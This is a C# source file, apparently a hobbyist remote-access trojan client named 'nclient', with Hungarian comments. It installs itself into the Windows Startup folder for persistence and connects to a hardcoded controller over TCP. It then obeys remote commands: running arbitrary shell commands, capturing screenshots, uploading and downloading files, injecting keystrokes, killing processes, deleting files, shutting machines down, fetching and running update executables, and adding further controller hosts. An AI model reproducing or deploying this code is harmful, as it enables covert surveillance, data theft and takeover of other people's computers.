using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using System.Reflection;
using Microsoft.VisualBasic.Devices;
using System.Threading;
using System.Management;

namespace nclient
{
    internal class Program
    {
        [DllImport("user32")]
        public static extern void LockWorkStation();


        [DllImport("user32")]
        public static extern void ExitWindowsEx(GraphicsUnit uflags, uint dwReason);

        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);

        // WinAPI hívás importálása
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SystemParametersInfo(
            int uAction, int uParam, string lpvParam, int fuWinIni);

        // Konstansok
        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;


        [Guid("5CDF2C82-841E-4546-9722-0CF74078229A")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioEndpointVolume
        {
            // 1
            int RegisterControlChangeNotify(IntPtr pNotify);
            // 2
            int UnregisterControlChangeNotify(IntPtr pNotify);
            // 3
            int GetChannelCount(out uint pnChannelCount);
            // 4
            int SetMasterVolumeLevel(float fLevelDB, Guid pguidEventContext);
            // 5
            int SetMasterVolumeLevelScalar(float fLevel, Guid pguidEventContext);
            // 6
            int GetMasterVolumeLevel(out float pfLevelDB);
            // 7
            int GetMasterVolumeLevelScalar(out float pfLevel);
            // 8
            int SetChannelVolumeLevel(uint nChannel, float fLevelDB, Guid pguidEventContext);
            // 9
            int SetChannelVolumeLevelScalar(uint nChannel, float fLevel, Guid pguidEventContext);
            // 10
            int GetChannelVolumeLevel(uint nChannel, out float pfLevelDB);
            // 11
            int GetChannelVolumeLevelScalar(uint nChannel, out float pfLevel);
            // 12
            int SetMute(bool bMute, Guid pguidEventContext);
            // 13
            int GetMute(out bool pbMute);
            // 14
            int GetVolumeStepInfo(out uint pnStep, out uint pnStepCount);
            // 15
            int VolumeStepUp(Guid pguidEventContext);
            // 16
            int VolumeStepDown(Guid pguidEventContext);
            // 17
            int QueryHardwareSupport(out uint pdwHardwareSupportMask);
            // 18
            int GetVolumeRange(out float pflVolumeMindB, out float pflVolumeMaxdB, out float pflVolumeIncrementdB);
        }
        [ComImport]
        [Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
        class MMDeviceEnumerator
        {
        }




        public static void SetWallpaper(string path)
        {
            // Beállítja az új háttérképet
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }



        //megcsinálja a directorykat
        public static string appdataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string workPath = appdataPath + "\\negnox";
        public static string exetPath = workPath + "\\exet";
        public static string dataPath = workPath + "\\data";
        public static string updatePath = workPath + "\\update";

        public static string currentPath = Directory.GetCurrentDirectory();

        //uj update rendszer
        public static bool isBeingUpdated = false;
        public static string serverIP = "192.168.9.105";

        public static string localIP = string.Empty;


        public static string screenshotPath = "";





        static async Task Main(string[] args)
        {
            var host = Dns.GetHostName(); // a gép hostneve
            foreach (var ip in Dns.GetHostEntry(host).AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            
            Console.WriteLine("Helyi hálózati IP: " + localIP);

            

            if (!Directory.Exists(workPath)) Directory.CreateDirectory(workPath);
            if (!Directory.Exists(exetPath)) Directory.CreateDirectory(exetPath);
            if (!Directory.Exists(dataPath)) Directory.CreateDirectory(dataPath);
            if (!Directory.Exists(updatePath)) Directory.CreateDirectory(updatePath);

            string command = "";
            string text = "";


            string ezAzExeFajlHelyeEsNeve = Assembly.GetExecutingAssembly().Location;
            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);


            bool update = false;

            //update
            if (Path.GetFileNameWithoutExtension(ezAzExeFajlHelyeEsNeve) == "update") update = true;


            
            if (Path.GetDirectoryName(ezAzExeFajlHelyeEsNeve) != startupPath)
            {

                if (File.Exists(startupPath + "\\nclient.exe"))//sort of autoupdate
                {
                    if (update)
                    {
                        Console.WriteLine("updating");
                        File.Delete(startupPath + "\\nclient.exe");
                        File.Copy(Assembly.GetExecutingAssembly().Location, startupPath + "\\nclient.exe");
                        Process.Start(startupPath + "\\nclient.exe");
                        Application.Exit();
                        Environment.Exit(0);
                    }
                    else
                    {
                        //File.SetAttributes(startupPath + "\\WinRAR.exe", FileAttributes.Hidden);
                        Process.Start(startupPath + "\\nclient.exe");
                        Application.Exit();
                        Environment.Exit(0);
                    }

                }
                else
                {
                    File.Copy(Assembly.GetExecutingAssembly().Location, startupPath + "\\nclient.exe");
                    Process.Start(startupPath + "\\nclient.exe");
                    Application.Exit();
                    Environment.Exit(0);
                }
                Application.Exit();
                Environment.Exit(0);
            }

            Thread.Sleep(2000);
            int pid = Process.GetCurrentProcess().Id;
            foreach (var item in Process.GetProcessesByName("nclient"))
            {
                if (item.Id != pid)
                {
                    item.Close(); // kulturált
                    item.WaitForExit(2000);

                    if (!item.HasExited) item.Kill();
                }
            }

            if (File.Exists(workPath+"\\subcontrollers.txt"))
            {

                foreach (string item in File.ReadLines(workPath + "\\subcontrollers.txt"))
                {
                    _ = ListenToCommands(item);
                }
            }

            await ListenToCommands(serverIP);





        }

        public static async Task ListenToCommands(string subcontroller)
        {
            string command = "";
            string text = "";
        elorol://megpróbál ujra csatlakozni
            try
            {


                TcpClient client = new TcpClient(subcontroller, 2323);
                NetworkStream stream = client.GetStream();
                Console.WriteLine($"connected to {subcontroller}:2323");

                while (true)
                {
                    //Console.WriteLine("breki");
                    byte[] buffer = new byte[1024];
                    int bytes = await stream.ReadAsync(buffer, 0, buffer.Length);
                    text = Encoding.UTF8.GetString(buffer, 0, bytes);//itt kapja meg az üzeneteket
                    //Console.WriteLine(msg);
                    if (!string.IsNullOrEmpty(text))
                    {

                        switch (command)
                        {
                            case "kys":
                                Environment.Exit(0);
                                break;
                            case "setwallpaper":
                                try
                                {
                                    text = PathReplace(text);
                                    SetWallpaper(text);
                                }
                                catch (Exception e)
                                {
                                    command = "";
                                    Console.WriteLine(e);
                                }
                                command = "";
                                continue;
                            case "msgbox":
                                command = "";
                                File.WriteAllText(dataPath + "\\emesgebox.vbs", $"msgbox \"{text}\"");
                                Process.Start(dataPath + "\\emesgebox.vbs");
                                Console.WriteLine("emesgebox elinditvaxd");
                                continue;
                            case "mousex":
                                command = "";
                                try
                                {
                                    var pos = System.Windows.Forms.Cursor.Position;
                                    int mennyit = Convert.ToInt32(text);
                                    SetCursorPos(pos.X + mennyit, pos.Y);
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e);
                                }
                                continue;

                            case "mousey":
                                command = "";
                                try
                                {
                                    var pos = System.Windows.Forms.Cursor.Position;
                                    int mennyit = Convert.ToInt32(text);
                                    SetCursorPos(pos.X, pos.Y + mennyit);
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e);
                                }
                                continue;
                            case "keystroke":
                                command = "";
                                SendKeys.SendWait(text);
                                continue;
                            case "kill":
                                command = "";
                                foreach (var process in Process.GetProcessesByName(text.Trim())) process.Kill();
                                continue;
                            case "delete":
                                command = "";
                                try
                                {
                                    text = PathReplace(text); try
                                    {
                                        File.Delete(text);
                                    }
                                    catch (Exception e)
                                    {
                                        Console.WriteLine(e);
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e);
                                }
                                continue;
                            case "processS":
                                command = "";
                                try
                                {
                                    text = PathReplace(text);
                                    Process.Start(text);
                                }
                                catch (Exception e)
                                {
                                    command = "";
                                    Console.WriteLine(e);
                                }
                                continue;
                            case "logoff":
                                command = "";
                                Console.WriteLine(text);
                                try
                                {
                                    ExitWindowsEx(0, 0);
                                    MessageBox.Show("kilogoffolt a géped báttya");
                                }
                                catch (Exception e)
                                {
                                    command = "";
                                    Console.WriteLine(e);
                                }
                                break;
                            case "shutdown":
                                command = "";
                                Console.WriteLine(text);
                                try
                                {
                                    Process.Start("shutdown.exe", "-s -t 00");
                                }
                                catch (Exception e)
                                {
                                    command = "";
                                    Console.WriteLine(e);
                                }
                                break;
                            case "restart":
                                command = "";
                                Console.WriteLine(text);
                                try
                                {
                                    Process.Start("shutdown.exe", "-r -t 00");
                                }
                                catch (Exception e)
                                {
                                    command = "";
                                    Console.WriteLine(e);
                                }
                                break;

                            case "update":
                                command = "";
                                isBeingUpdated = true;
                                Console.WriteLine(text);
                                break;

                            case "getres":
                                command = "";
                                Send("meleg vagy", stream);
                                break;


                            //fetches
                            case "fsi":

                                var computer = new ComputerInfo();
                                Process cmdprocess = new Process();

                                ProcessStartInfo psi = new ProcessStartInfo();
                                psi.FileName = "cmd.exe";
                                psi.Arguments = "/c whoami";  // /c = futtatja, majd bezárja a cmd-t
                                psi.RedirectStandardOutput = true; // ide fogja irányítani a kimenetet
                                psi.RedirectStandardError = true;  // hibaüzeneteket is lekérheted
                                psi.UseShellExecute = false;       // kötelező a redirekcióhoz
                                psi.CreateNoWindow = true;         // ne nyisson új ablakot
                                cmdprocess.StartInfo = psi;
                                cmdprocess.Start();
                                cmdprocess.WaitForExit();
                                string output = cmdprocess.StandardOutput.ReadToEnd();
                                string errors = cmdprocess.StandardError.ReadToEnd();

                                string wininfo = $"{computer.OSFullName} ({computer.OSPlatform}) {computer.OSVersion}";
                                Console.WriteLine(wininfo);
                                string whoami = output.Trim();

                                ulong total = computer.TotalPhysicalMemory;
                                ulong available = computer.AvailablePhysicalMemory;
                                string usedMb = $"{ (total - available) / 1024 / 1024 }";
                                string totalMb = $"{total / 1024 / 1024}";
                                Console.WriteLine(usedMb);
                                Console.WriteLine(totalMb);
                                var cpu = new PerformanceCounter("Processor", "% Processor Time", "_Total");
                                cpu.NextValue();

                                Thread.Sleep(800);
                                string cpuszazalek = $"{cpu.NextValue()}";
                                Console.WriteLine(cpuszazalek);



                                string hostName = System.Net.Dns.GetHostName();




                                ManagementObjectSearcher objvida = new ManagementObjectSearcher("select * from Win32_VideoController ");

                                string VC = String.Empty;

                                string DI = String.Empty;

                                foreach (ManagementObject objaj in objvida.Get())

                                {

                                    if (objaj["CurrentBitsPerPixel"] != null && objaj["CurrentHorizontalResolution"] != null)
                                    {

                                        if ((String)objaj["DeviceID"] == "VideoController2")

                                        {

                                            DI = objaj["DeviceID"].ToString();

                                            VC = objaj["Description"].ToString();

                                            Console.WriteLine(DI);

                                            Console.WriteLine(VC);

                                        }

                                    }

                                }


                                string adatok = $"sysinfo|{wininfo}|{whoami}|{usedMb}|{totalMb}|{cpuszazalek}|{hostName}|{DI}\n{VC}|";
                                //sysinfo|wininfo|whoami|usedMB|totalMB|cpu|hostname|videokartyainfok|

                                Console.WriteLine(adatok);
                                //Console.WriteLine("nyomjleegygombot");
                                //Console.ReadKey();
                                //Send(adatok, stream);

                                //Console.ReadKey();
                                Send(adatok, stream);



                                Console.WriteLine("elkudlte elvilegxd");
                                //Console.ReadKey();
                                command = "";
                                continue;
                            case "frp":
                                command = "";
                                string runningProcesses = @"rp|";

                                Process[] rProcesses = Process.GetProcesses();

                                rProcesses.OrderBy(x => x.ProcessName);
                                foreach (Process i in rProcesses)
                                {
                                    runningProcesses += $"{i.ProcessName}\n";
                                }
                                Send(runningProcesses, stream);
                                continue;
                            case "fsc":
                                command = "";
                                Screen[] screens = Screen.AllScreens;
                                string returner = $"screens|{screens.Length}|";
                                foreach (Screen item in screens) returner += $"{item.DeviceName}|{item.Primary}|{item.Bounds.Width}|{item.Bounds.Height}|";
                                Send(returner, stream);
                                continue;
                            case "screenshot":
                                command = "";
                                TakeScreenshot();
                                Console.WriteLine("screenshot megvan");
                                SendFile(screenshotPath, "melegvagy", client);
                                Console.WriteLine("elv vége a sendfilenak, idk megjött e, mingy kiderül");
                                continue;
                            case "cmd":
                                command = "";
                                string texted = "";
                                try
                                {
                                    // Parancs

                                    // Folyamat beállítása
                                    psi = new ProcessStartInfo();
                                    psi.FileName = "cmd.exe";
                                    psi.Arguments = "/c " + text;  // /c = futtatja, majd bezárja a cmd-t
                                    psi.RedirectStandardOutput = true; // ide fogja irányítani a kimenetet
                                    psi.RedirectStandardError = true;  // hibaüzeneteket is lekérheted
                                    psi.UseShellExecute = false;       // kötelező a redirekcióhoz
                                    psi.CreateNoWindow = true;         // ne nyisson új ablakot

                                    // Folyamat indítása
                                    using (Process process = Process.Start(psi))
                                    {
                                        // Kimenet beolvasása
                                        output = process.StandardOutput.ReadToEnd();
                                        errors = process.StandardError.ReadToEnd();

                                        process.WaitForExit(); // megvárjuk, amíg lefut
                                        Console.WriteLine(output);
                                        texted = output;

                                        if (!string.IsNullOrEmpty(errors))
                                        {
                                            texted = errors;
                                        }
                                    }
                                }
                                catch (Exception)
                                {
                                    Console.WriteLine("idk");
                                }
                                Send($"cmd|{localIP}|{texted}", stream);


                                break;


                            //fajlkezeles
                            case "cd":
                                command = "";
                                returner = "";
                                try
                                {
                                    if (text == "..")
                                    {
                                        Directory.SetCurrentDirectory(Directory.GetParent(Directory.GetCurrentDirectory()).ToString());
                                    }
                                    else
                                    {
                                        text = PathReplace(text);
                                        Directory.SetCurrentDirectory(text);
                                    }
                                }
                                catch (Exception e)
                                {
                                    returner = $"cd|{e}";
                                }
                                Send(returner, stream);
                                break;
                            case "cd..":

                                command = "";
                                returner = "";
                                try
                                {
                                    Directory.SetCurrentDirectory(Directory.GetParent(Directory.GetCurrentDirectory()).ToString());
                                }
                                catch (Exception e)
                                {
                                    returner = e.ToString();
                                }
                                Send(returner, stream);
                                break;
                            case "ls":
                                command = "";
                                returner = $"ls|";
                                List<string> cuccokAKonyvtarban = new List<string>();
                                try
                                {
                                    Directory.GetFileSystemEntries(Directory.GetCurrentDirectory()).ToList().ForEach(a => cuccokAKonyvtarban.Add($"{a}"));
                                    for (int i = 0; i < cuccokAKonyvtarban.Count(); i++)
                                    {
                                        bool mappa = (File.GetAttributes(cuccokAKonyvtarban[i]) & FileAttributes.Directory) == FileAttributes.Directory;
                                        if (mappa)
                                        {
                                            cuccokAKonyvtarban[i] += "?mappa";
                                        }
                                        else cuccokAKonyvtarban[i] += "?fajl";
                                    }
                                    foreach (string item in cuccokAKonyvtarban)
                                    {
                                        Console.WriteLine(item);
                                    }
                                }
                                catch (Exception e)
                                {
                                    cuccokAKonyvtarban.Add(e.ToString());
                                }
                                foreach (string a in cuccokAKonyvtarban)
                                {
                                    returner += $"{a}\n";
                                }
                                Send(returner, stream);
                                break;
                            case "pwd":
                                command = "";
                                Send($"pwd|{Directory.GetCurrentDirectory()}", stream);
                                Thread.Sleep(200);
                                break;
                            case "download":
                                command = "";
                                if (File.Exists(text)) SendFile(text, "melegvagy", client);
                                else
                                {
                                    Send("download", stream);
                                }
                                break;






                            case "audio":
                                command = "";
                                try
                                {
                                    // MMDeviceEnumerator létrehozása
                                    var enumerator = new MMDeviceEnumerator() as IMMDeviceEnumerator;

                                    // Alapértelmezett kimeneti eszköz
                                    enumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out IMMDevice device);

                                    // IAudioEndpointVolume lekérése
                                    Guid iid = typeof(IAudioEndpointVolume).GUID;
                                    device.Activate(ref iid, CLSCTX.ALL, IntPtr.Zero, out object obj);

                                    var volume = (IAudioEndpointVolume)obj;

                                    // 🔊 50% hangerő
                                    volume.SetMasterVolumeLevelScalar((float)(Convert.ToDouble(text) / 100.0), Guid.Empty);
                                }
                                catch (Exception)
                                {
                                    Send("audio|nem jó érték audióra", stream);
                                }

                                break;


                            case "subcontroller":
                                command = "";

                                string[] darabolva = text.Split(' ');
                                switch (darabolva[0])
                                {
                                    case "add":
                                        File.AppendAllLines(Path.Combine(workPath, "subcontrollers.txt"), new string[] { darabolva[1] });
                                        _ = ListenToCommands(darabolva[1]);
                                        break;
                                    case "remove":

                                        var file = Path.Combine(workPath, "subcontrollers.txt");
                                        var ipToRemove = darabolva[1]?.Trim();

                                        if (File.Exists(file) && !string.IsNullOrWhiteSpace(ipToRemove))
                                        {
                                            var lines = File.ReadAllLines(file)
                                                .Select(l => l.Trim())
                                                .Where(l => !string.IsNullOrWhiteSpace(l))   // üres sorok kuka
                                                .Where(l => l != ipToRemove)                // törlendő IP kuka
                                                .Distinct()                                 // opcionális duplikátum szűrés
                                                .ToArray();

                                            File.WriteAllLines(file, lines);
                                        }
                                        break;
                                    case "list":
                                        if (File.Exists(Path.Combine(workPath, "subcontrollers.txt")))
                                        {
                                            Send($"subcontrollerlist|{File.ReadAllText(Path.Combine(workPath, "subcontrollers.txt"))}", stream);
                                        }
                                        else
                                        {
                                            Send($"subcontrollerlist|[$Nincsen subcontroller fajl még$]", stream);
                                        }
                                        
                                        break;
                                    default:
                                        break;
                                }

                                break;
                            case "reload":
                                command = "";
                                var psis = new ProcessStartInfo
                                {
                                    FileName = Path.Combine(
                                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                                    "nclient.exe"
                                ),
                                    UseShellExecute = true
                                };

                                Process.Start(psis);
                                Environment.Exit(0);
                                break;


                            case "file|":
                                Console.WriteLine("ezt jo tudni hogy jo minden, bejott a file-ba");
                                GetFile(stream, text);
                                command = "";


                                continue;
                            default:

                                command = text;
                                continue;
                        }

                    }
                    command = text;

                    Console.WriteLine(text);



                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                goto elorol;
            }


        }




        static void GetFile(NetworkStream stream, string hova)
        {
            if (hova == ":DDD")
            {
                hova = ".\\";
            }
            hova = PathReplace(hova);
            string fileName = ReadLine(stream);
            string[] fileNameDarabolva = fileName.Split('\\');
            fileName = fileNameDarabolva.Last();
            //Console.WriteLine(ReadLine(stream));
            string asd = ReadLine(stream);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(asd);
            Console.ForegroundColor = ConsoleColor.Gray;
            long fileSize = long.Parse(asd);

            //Directory.CreateDirectory("received");

            if (isBeingUpdated)
            {
                hova = updatePath;
                fileName = "update.exe";
            }
            string path = Path.Combine(hova, fileName);

            path = PathReplace(path);
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(path);
            Console.ForegroundColor = ConsoleColor.Gray;

            if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(fileName)).Length > 0)
            {
                Console.WriteLine("nem sikerült felulirni mert már fut:(");
                return;
            }

            using (FileStream fs = new FileStream(path, FileMode.Create))
            {
                byte[] buffer = new byte[8192];
                long totalRead = 0;

                while (totalRead < fileSize)
                {
                    int read = stream.Read(buffer, 0,
                        (int)Math.Min(buffer.Length, fileSize - totalRead));

                    if (read <= 0)
                        throw new IOException("Kapcsolat megszakadt");

                    fs.Write(buffer, 0, read);
                    totalRead += read;
                }
            }

            if (isBeingUpdated)
            {
                Process.Start(path);
                Environment.Exit(0);
            }
        }

        static void Send(string message, NetworkStream stream)
        {
            string targetIp = serverIP;
            byte[] data = Encoding.UTF8.GetBytes(message);
            // Keressük a kliens listában
            Console.WriteLine("ide még eljutott");
            try
            {
                stream.Write(data, 0, data.Length);
                Console.WriteLine($"[{message} elküldve erre : {targetIp}]");
                //Console.ReadKey();
                //Log($"[÷{message}÷ |elküldve erre :| ÷{targetIp}÷]");
            }
            catch(Exception ex)
            {
                Console.WriteLine($"[Hiba a küldés során {targetIp}-nek.]");
                //Log($"[$Hiba a küldés során$÷ {targetIp}÷$-nek.$]");
            }

            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("ide is");
            //Console.ReadKey();
        }



        static string ReadLine(NetworkStream stream)
        {
            List<byte> bytes = new List<byte>();
            int b;

            while ((b = stream.ReadByte()) != -1)
            {
                if (b == '|')
                    break;

                bytes.Add((byte)b);
            }
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(Encoding.UTF8.GetString(bytes.ToArray()));
            Console.ForegroundColor = ConsoleColor.Gray;
            return Encoding.UTF8.GetString(bytes.ToArray());
        }

        public static void SendFile(string filePath, string targetFilePath, TcpClient client)
        {

            if (!File.Exists(filePath))
            {
                Log("[Nincs ilyen fájl!]");
                return;
            }

            byte[] fileData = File.ReadAllBytes(filePath);
            string fileName = Path.GetFileName(filePath);

            string header = $"file|{fileName}|{fileData.Length}\n";

            SendFileToClient(client, header, fileData, fileName, targetFilePath);
            /*
            lock (kliensek)
            {
                if (vanTarget)
                {
                    var client = kliensek.FirstOrDefault(c =>
                        ((IPEndPoint)c.Client.RemoteEndPoint).Address.ToString() == targetIp);

                    if (client == null)
                    {
                        Log($"[Nincs ilyen kliens: {targetIp}]");
                        return;
                    }

                    SendFileToClient(client, header, fileData, fileName, targetFilePath);
                }
                else
                {
                    foreach (var client in kliensek.ToList())
                    {
                        SendFileToClient(client, header, fileData, fileName, targetFilePath);
                    }
                }
            }*/
        }
        public static void SendFileToClient(TcpClient client, string header, byte[] fileData, string fileName, string targetFilePath)
        {
            byte[] headerFileData = Encoding.UTF8.GetBytes(header.Split('|')[0] + "|");
            byte[] headerFileNameData = Encoding.UTF8.GetBytes(header.Split('|')[1] + "|");
            byte[] headerFileLengthData = Encoding.UTF8.GetBytes(header.Split('|')[2] + "|");
            try
            {
                NetworkStream stream = client.GetStream();

                stream.Write(headerFileData, 0, headerFileData.Length);
                Log("[|headerFileData Elküldve|]");
                Thread.Sleep(500);
                //Console.Write("------"+targetFilePath);
                //stream.Write(Encoding.UTF8.GetBytes(targetFilePath), 0, Encoding.UTF8.GetBytes(targetFilePath).Length);
                //Log("[|dummyText Elküldve|]");
                //Thread.Sleep(1000);
                stream.Write(headerFileNameData, 0, headerFileNameData.Length);
                Log("[|headerFileNameData Elküldve|]");
                Thread.Sleep(500);
                stream.Write(headerFileLengthData, 0, headerFileLengthData.Length);
                Log("[|headerFileLengthData Elküldve|]");
                Thread.Sleep(500);
                stream.Write(fileData, 0, fileData.Length);
                Log("[|fileData Elküldve|]");

                Log($"[Fájl elküldve: {fileName} -> {((IPEndPoint)client.Client.RemoteEndPoint).Address}]");
            }
            catch (Exception ex)
            {
                Log($"[Fájl küldési hiba: {ex.Message}]");
            }
        }





        //sajat cuccok

        public static string PathReplace(string path)
        {
            if (path.Contains("%desktop%")) path = path.Replace("%desktop%", Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            else if (path.Contains("%appdata%")) path = path.Replace("%appdata%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            else if (path.Contains("%startup%")) path = path.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup));
            else if (path.Contains("%startmenu%")) path = path.Replace("%startmenu%", Environment.GetFolderPath(Environment.SpecialFolder.StartMenu));
            else if (path.Contains("%exetpath%")) path = path.Replace("%exetpath%", exetPath);
            return path;
        }
        public static void Log(string message)// ennek a metodusnak az a lényege hogy ha | közé teszel valamit, zölden írja ki, ha $ közé teszel valamit, pirsos, ha pedig ÷ közé akkor cyan
        {
            Console.ForegroundColor = ConsoleColor.Gray;
            int zoldSzamlalo = 0;
            int pirosSzamlalo = 0;
            int cyanSzamlalo = 0;
            foreach (string item in message.Split('|'))
            {
                zoldSzamlalo++;
                if (zoldSzamlalo % 2 == 0) { Console.ForegroundColor = ConsoleColor.Green; Console.Write(item); }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Gray;
                    foreach (string item1 in item.Split('$'))
                    {
                        pirosSzamlalo++;
                        if (pirosSzamlalo % 2 == 0)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.Write(item1);
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Gray;
                            foreach (string item2 in item1.Split('÷'))
                            {
                                cyanSzamlalo++;
                                if (cyanSzamlalo % 2 == 0)
                                {
                                    Console.ForegroundColor = ConsoleColor.Cyan;
                                    //Console.Write(item2);
                                }
                                else Console.ForegroundColor = ConsoleColor.Gray;
                                Console.Write(item2);
                            }
                            cyanSzamlalo = 0;
                        }
                    }
                    pirosSzamlalo = 0;
                }

            }
            Console.WriteLine();
        }




        private static void TakeScreenshot()
        {
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");

            // A teljes desktop bounding rectangle meghatározása
            int minX = Screen.AllScreens.Min(s => s.Bounds.X);
            int minY = Screen.AllScreens.Min(s => s.Bounds.Y);
            int maxX = Screen.AllScreens.Max(s => s.Bounds.Right);
            int maxY = Screen.AllScreens.Max(s => s.Bounds.Bottom);

            int width = maxX - minX;
            int height = maxY - minY;

            using (Bitmap fullBmp = new Bitmap(width, height))
            using (Graphics g = Graphics.FromImage(fullBmp))
            {
                // Háttér kitöltése (nem kötelező)
                g.Clear(Color.Black);

                foreach (var screen in Screen.AllScreens)
                {
                    Rectangle bounds = screen.Bounds;

                    g.CopyFromScreen(
                        sourceX: bounds.X,
                        sourceY: bounds.Y,
                        destinationX: bounds.X - minX,
                        destinationY: bounds.Y - minY,
                        blockRegionSize: bounds.Size
                    );
                }


                string fileName = $"{localIP}_screenshot_" + timestamp + "_.png";
                fullBmp.Save($"{dataPath}\\{fileName}", System.Drawing.Imaging.ImageFormat.Png);
                screenshotPath = $"{dataPath}\\{fileName}";
                Console.WriteLine("Összefűzött screenshot mentve: " + $"{dataPath}\\{fileName}");
               

            }
        }


    }

    #region Core Audio COM interop

    enum EDataFlow
    {
        eRender,
        eCapture,
        eAll
    }

    enum ERole
    {
        eConsole,
        eMultimedia,
        eCommunications
    }

    [Flags]
    enum CLSCTX
    {
        INPROC_SERVER = 0x1,
        INPROC_HANDLER = 0x2,
        LOCAL_SERVER = 0x4,
        ALL = INPROC_SERVER | INPROC_HANDLER | LOCAL_SERVER
    }

    [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDeviceEnumerator
    {
        int NotImpl1();
        int GetDefaultAudioEndpoint(EDataFlow dataFlow, ERole role, out IMMDevice ppDevice);
    }

    [Guid("D666063F-1587-4E43-81F1-B948E807363F"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDevice
    {
        int Activate(ref Guid iid, CLSCTX dwClsCtx, IntPtr pActivationParams,
                     [MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
    }

    [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IAudioEndpointVolume
    {
        int RegisterControlChangeNotify(IntPtr pNotify);
        int UnregisterControlChangeNotify(IntPtr pNotify);
        int GetChannelCount(out uint channelCount);
        int SetMasterVolumeLevel(float level, Guid eventContext);
        int SetMasterVolumeLevelScalar(float level, Guid eventContext);
        int GetMasterVolumeLevel(out float level);
        int GetMasterVolumeLevelScalar(out float level);
        int SetMute(bool isMuted, Guid eventContext);
        int GetMute(out bool isMuted);
    }

    #endregion
}
